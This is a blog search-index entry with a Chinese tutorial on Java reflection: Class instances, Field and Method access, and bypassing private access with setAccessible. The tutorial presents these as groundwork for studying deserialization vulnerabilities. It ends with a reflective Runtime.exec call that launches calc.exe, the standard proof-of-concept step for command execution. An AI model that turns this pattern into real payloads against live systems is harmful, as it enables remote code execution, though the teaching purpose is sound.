<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA（反射）</title>
      <link href="/2020/08/26/JAVA%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89/"/>
      <url>/2020/08/26/JAVA%EF%BC%88%E5%8F%8D%E5%B0%84%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="关于反射"><a href="#关于反射" class="headerlink" title="关于反射"></a>关于反射</h3><p>&emsp;通过Class实例获取class信息的方法称为<strong>反射</strong>。Java的反射机制提供为Java工程师的开发提供了相当多的便利性，同样也带来了潜在的安全风险。反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态，极有可能给恶意代码提供可乘之机。想要揭开JAVA反序列化漏洞的秘密，就必须学习JAVA的反射机制。</p><h3 id="获取Class"><a href="#获取Class" class="headerlink" title="获取Class"></a>获取Class</h3><p>&emsp;JVM在执行过程中，每读到一个类<code>class</code>，就会在内存中为其创建一个<code>Class实例</code>，这里的<code>Class</code>其实也是一种类，而<code>Class实例</code>就是这种<code>Class类</code>的对象，只不过它记录的是对应类的<strong>类名</strong>、<strong>包名</strong>、<strong>父类</strong>、<strong>实现的接口</strong>、<strong>所有方法</strong>、<strong>字段</strong>等信息，可以说是类的个人资料。<br>&emsp;比如创建了个Person类</p><pre class=" language-java"><code class="language-java">Person Wkai <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>&emsp;当JVM读取到这行时，首先会读取<code>Person.class</code>，然后在内存为其创建个<code>Person</code>的<code>Class实例</code>并关联起来，这个实例是由<code>JVM</code>内部创建的，如果我们查看源码，可以发现<code>Class</code>的构造方法是<code>private</code>，只有<code>JVM</code>才能创建，无法人为地创建。<br>所以每个Class实例都对应着一种数据类型</p><pre class=" language-java"><code class="language-java"> ───────────────────────────┐│      Class <span class="token class-name">Instance</span>       │──────<span class="token operator">></span> String├───────────────────────────┤│name <span class="token operator">=</span> <span class="token string">"java.lang.String"</span>  │├───────────────────────────┤│<span class="token keyword">package</span> <span class="token operator">=</span> <span class="token string">"java.lang"</span>      │├───────────────────────────┤│<span class="token keyword">super</span> <span class="token operator">=</span> <span class="token string">"java.lang.Object"</span> │├───────────────────────────┤│<span class="token keyword">interface</span> <span class="token operator">=</span> CharSequence<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>│├───────────────────────────┤│field <span class="token operator">=</span> value<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>hash<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   │├───────────────────────────┤│method <span class="token operator">=</span> <span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      │└───────────────────────────┘</code></pre><p>那么如何获取一个<code>Class实例</code>呢?</p><p>有三种方法<br>&emsp;第一种：直接通过一个<code>class</code>的静态变量<code>class</code>获取</p><pre class=" language-java"><code class="language-java">Class <span class="token class-name">cls</span> <span class="token operator">=</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span></code></pre><p>&emsp;第二种：如果已经有了一个实例变量，可以通过该实例变量的<code>getClass()</code>方法获取</p><pre class=" language-java"><code class="language-java">Person Wkai <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Class <span class="token class-name">cls</span> <span class="token operator">=</span> Wkai<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>&emsp;第三种：如果知道一个class的完整类名，可以通过静态方法<code>Class.forName()</code>获取</p><pre class=" language-java"><code class="language-java">Class <span class="token class-name">cls</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>小结<br>&emsp;<code>JVM</code>为每个加载的<code>class</code>及<code>interface</code>创建了对应的<code>Class实例</code>来保存<code>class</code>及<code>interface</code>的所有信息；<br>&emsp;获取一个<code>class</code>对应的<code>Class实例</code>后，就可以获取该<code>class</code>的所有信息；<br>&emsp;通过<code>Class实例</code>获取<code>class</code>信息的方法称为<code>反射（Reflection）</code>；<br>&emsp;<code>JVM</code>总是动态加载<code>class</code>，可以在运行期根据条件来控制加载<code>class</code>。</p><br><hr><br><h3 id="获取字段和值"><a href="#获取字段和值" class="headerlink" title="获取字段和值"></a>获取字段和值</h3><ul><li><p>对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。</p></li><li><p>Class提供了以下几种方法来获取字段</p><ul><li><code>Field getField(name)</code>：根据字段名获取某个public的field（包括父类）</li><li><code>Field getDeclaredField(name)</code>：根据字段名获取当前类的某个field（不包括父类）</li><li><code>Field[] getFields()</code>：获取所有public的field（包括父类）</li><li><code>Field[] getDeclaredFields()</code>：获取当前类的所有field（不包括父类）</li></ul></li><li><p>首先我们来看看<code>getField(name)</code>和<code>getDeclaredField(name)</code></p><ul><li><p>他们的区别是这样的</p><ul><li><code>getDeclaredField</code>是可以获取一个类的所有字段，<code>getField</code>只能获取类的<code>public 字段</code>. </li></ul></li><li><p>那么有人问了<code>Field</code>又是啥玩意</p><ul><li><strong>具体来说<code>Field</code>也是一种类，只不过这种类实例化后的对象是用来记录某个字段所有的值</strong></li></ul></li><li><p>具体用法是这样的</p><ul><li>首先我定义了一个<code>Person类</code></li><li>通过<code>Person类</code>创建了个<code>子类Student</code>，并且拓展了两个字段</li><li>那么我通过这个<code>student类</code>获取一个关联它的Class实例<code>stdClass</code></li><li>接着通过这个实例<code>stdClass</code>，来获取student类的指定字段的Field实例</li><li>获取方式就是<code>getField(name)</code>和<code>getDeclaredField(name)</code></li></ul></li></ul></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">stdClass</span> <span class="token operator">=</span> Student<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取public字段"score":</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"score"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取继承的public字段"name":</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取private字段"grade":</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"grade"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> score<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> grade<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String name<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>运行结果</li></ul><pre><code>public int Student.scorepublic java.lang.String Person.nameprivate int Student.grade</code></pre><br><ul><li><p>再看看<code>Field类</code></p></li><li><p><code>Field类</code>中也定义了许多方法</p><ul><li><code>getName()</code>：返回字段名称，例如，”name”；</li><li><code>getType()</code>：返回字段类型，也是一个Class实例，例如，String.class；</li><li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的<code>bit</code>表示不同的含义。</li><li><code>get()</code>：获取指定实例在<code>Field实例</code>中的值</li></ul></li><li><p>接着看看代码</p></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java">Field f <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "value"</span>f<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// class [B 表示byte[]类型</span><span class="token keyword">int</span> m <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Modifier<span class="token punctuation">.</span><span class="token function">isFinal</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>Modifier<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span>Modifier<span class="token punctuation">.</span><span class="token function">isProtected</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span>Modifier<span class="token punctuation">.</span><span class="token function">isPrivate</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>Modifier<span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span></code></pre><ul><li>这里先是定义了一个<code>String类</code></li><li>然后调用<code>String类</code>的<code>Class实例</code>里的获取字段名函数返回了一个Field类型实例</li><li>通过Field类型实例的<code>getName()</code>方法可以获取字段名</li><li>通过Field类型实例的<code>getType()</code>方法可以获取字段类型</li><li>通过<code>getModifiers()</code>函数可以判断字段是public还是Private等类型的字段</li></ul><br><ul><li>那么如何获取字段的值呢</li><li>对于一个Person实例，我们可以先拿到name字段对应的Field，再获取这个实例的name字段的值</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Object p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Xiao Ming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里要注意通过main类是无法直接访问private类型的字段值的，通过setAccessible(true)可以设置任意访问</span>        Object value <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这里不知道为啥返回的字段值类型得是Object</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "Xiao Ming" </span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>这里先是通过Person实例p获取Person类的Class实例</li><li>然后通过Person类的Class实例获取关于字段name的Field实例</li><li>再通过Field实例的<code>get()</code>函数来获取指定实例对应的字段值</li></ul><br><ul><li><p>既然可以查看字段值，那么可以设置字段值吗</p><ul><li>通过Field实例既然可以获取到指定实例的字段值，自然也可以设置字段的值。</li></ul></li><li><p>设置字段值是通过<code>Field.set(Object, Object)</code>实现的</p></li><li><p>过程和查询字段值类似，只不过调用的方法变成了<code>set()</code></p></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Xiao Ming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "Xiao Ming"</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//同样的修改private类型的字段值也是需要设置这一项</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"Xiao Hong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "Xiao Hong"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><p>总结</p><ul><li>Java的反射API提供的Field类封装了字段的所有信息：</li><li>通过Class实例的方法可以获取Field实例：<code>getField()</code>，<code>getFields()</code>，<code>getDeclaredField()</code>，<code>getDeclaredFields()</code>；</li><li>通过Field实例可以获取字段信息：<code>getName()</code>，<code>getType()</code>，<code>getModifiers()</code>；</li><li>通过Field实例可以读取某个对象的字段<code>get()</code>，如果存在访问限制，要首先调用<code>setAccessible(true)</code>来访问非public字段。同样设置某个对象的字段<code>set()</code>，也要调用<code>setAccessible(true)</code></li><li>通过反射读写字段是一种非常规方法，它会破坏对象的封装。</li></ul></li></ul><br><hr><br><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><ul><li><p>上面说到Class实例可以返回一个Field的实例</p></li><li><p>而Class实例除了记录字段，还记录了方法</p></li><li><p>那么可不可以返回关于方法的信息，并且直接调用方法呢</p></li><li><p>Class类提供了以下几个方法来获取Method：</p><ul><li><code>Method getMethod(name, Class...)</code>：获取某个public的Method（包括父类）</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个Method（不包括父类）</li><li><code>Method[] getMethods()</code>：获取所有public的Method（包括父类）</li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有Method（不包括父类）</li></ul></li><li><p>示例代码</p></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Class <span class="token class-name">stdClass</span> <span class="token operator">=</span> Student<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取public方法getScore，参数为String:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getScore"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取继承的public方法getName，无参数:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取private方法getGrade，参数为int:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stdClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getGrade"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getScore</span><span class="token punctuation">(</span>String type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">99</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">getGrade</span><span class="token punctuation">(</span><span class="token keyword">int</span> year<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"Person"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><p><strong>Method也是一种类，本身包含了返回对应类方法信息的方法</strong></p><ul><li><code>getName()</code>：返回方法名称，例如：”getScore”；</li><li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：String.class；</li><li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：{String.class, int.class}；</li><li><code>getModifiers()</code>：返回方法的修饰符，它是一个int，不同的bit表示不同的含义。</li><li><code>invoke(指定实例, 调用方法的参数)</code>：直接调用方法，必须指定实例，除非调用的方法是静态的</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// String对象:</span>        String s <span class="token operator">=</span> <span class="token string">"Hello world"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取String substring(int)方法，参数为int:</span>        Method m <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"substring"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 在s对象上调用该方法并获取结果:</span>        String r <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印调用结果:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>当访问静态方法的时候，是没有实例给你指定的，所以<code>invoke()</code>第一个参数为<code>null</code>就好了</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取Integer.parseInt(String)方法，参数为String:</span>        Method m <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"parseInt"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用该静态方法并获取结果:</span>        Integer n <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> <span class="token string">"12345"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 打印调用结果:</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>类似的，存在私有变量，同时也存在私有方法，访问私有方法的时候同样需要设置<code>setAccessible(true)</code></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//不设置就会报错</span>        m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><br><ul><li>最后再来看看这段代码</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>      Object runtime<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//因为Runtime类的实例是不能由我们创建的，所以需要通过getRuntime返回一个实例</span>      Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//需要指定实例，才能调用方法</span>  <span class="token punctuation">}</span></code></pre><ul><li><p>之前一直疑惑，为啥我调用个计算器需要这么多步骤，感觉怪怪的，给人一种多此一举的感觉</p></li><li><p>原来是因为Runtime类的实例必须是JVM虚拟机创建的，不能人为地创建，对比上边的Person的Method实例，可以直接创建个Person类的对象，然后invoke()马上就能用，而Runtime类还得通过<code>getRuntime()</code>来返回一个实例</p></li><li><p>再来说说什么是<strong>Runtime类</strong></p><ul><li><p>该类主要代表了应用程序的运行环境。一个Runtime就代表一个运行环境。</p></li><li><p>常用的方法有:</p></li><li><ul><li><code>getRuntime()</code>：该方法用于返回当前应用程序的运行环境对象。</li><li><code>exec(String command)</code>：该方法用于根据指定的路径执行对应的可执行文件。</li></ul></li></ul></li></ul><h5 id="参考"><a href="#参考" class="headerlink" 